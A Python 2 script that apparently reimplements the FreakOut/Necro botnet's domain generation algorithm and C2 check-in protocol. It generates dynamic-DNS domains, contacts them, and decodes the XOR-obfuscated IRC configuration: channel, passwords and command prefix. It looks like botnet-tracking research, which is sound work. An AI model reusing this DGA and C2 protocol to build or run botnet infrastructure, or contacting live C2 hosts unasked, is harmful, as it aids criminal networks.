#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import socket
import random
import struct
import zlib
import time

#XOR c2 config with n3cr0t0r_freakout
def xor_config(word):
    return ''.join([chr(ord(v) ^ ord("n3cr0t0r_freakout"[i % 17])) for i, v in enumerate(word)])


counter_=0

t1= 0
#enumerate DGA
while 1:
    t1 += 1
    if counter_>=0xFD:#break @ 253 domains
        break
    counter_+=1
    random.seed(a=0xFAFFDED00001 + counter_)#generate seed for DGA (python 2 only)
    c2domain =(''.join(random.choice("abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(random.randrange(10,19)))).lower()+"."+random.choice(["ddns.net","ddnsking.com","3utilities.com","bounceme.net","freedynamicdns.net","freedynamicdns.org","gotdns.ch","hopto.org","myddns.me","myftp.biz","myftp.org","myvnc.com","onthewifi.com","redirectme.net","servebeer.com","serveblog.net","servecounterstrike.com","serveftp.com","servegame.com","servehalflife.com","servehttp.com","serveirc.com","serveminecraft.net","servemp3.com","servepics.com","servequake.com","sytes.net","viewdns.net","webhop.me","zapto.org"])
    print c2domain

    
    try:

        #c2 checkin###############
        c2=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        c2.sendto('\x1b'+47 * '\0',("time.google.com",123))
        msg,c2response=c2.recvfrom(1024)
        t=struct.unpack("!12I",msg)[10] - 2208988800
        str_=lambda x : ''.join([str((x >> i) & 1) for i in range(32)])
        c2connect=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        c2connect.connect((c2domain, 0xCD56))
        c2connect.send(''.join([chr(random.randint(0,128)) if x == "0" else chr(random.randint(128,255)) for x in str_(t)]))
        ###########################


        #recv config###############        
        c2rec2=c2connect.recv(32)
        msg_part5=ord(c2rec2[-5])
        msg_part4=ord(c2rec2[-4])
        msg_part3=ord(c2rec2[-3])
        msg_part2=ord(c2rec2[-2])
        msg_part1=ord(c2rec2[-1])
        ###########################


        #fetch config##############
        channel=zlib.decompress(xor_config(c2connect.recv(msg_part5)))
        print 'channel:',channel
        channel_password=zlib.decompress(xor_config(c2connect.recv(msg_part4)))
        print 'channel_password:',channel_password
        bot_password_hash=zlib.decompress(xor_config(c2connect.recv(msg_part3)))
        print 'bot_password_hash:',bot_password_hash
        cmdprefix=zlib.decompress(xor_config(c2connect.recv(msg_part2)))
        print 'cmdprefix:',cmdprefix
        irc_host=zlib.decompress(xor_config(c2connect.recv(msg_part1)))
        print 'irc_host:',irc_host
        c2connect.close()
        ###########################


    except Exception as e:
        raise

    time.sleep(10)



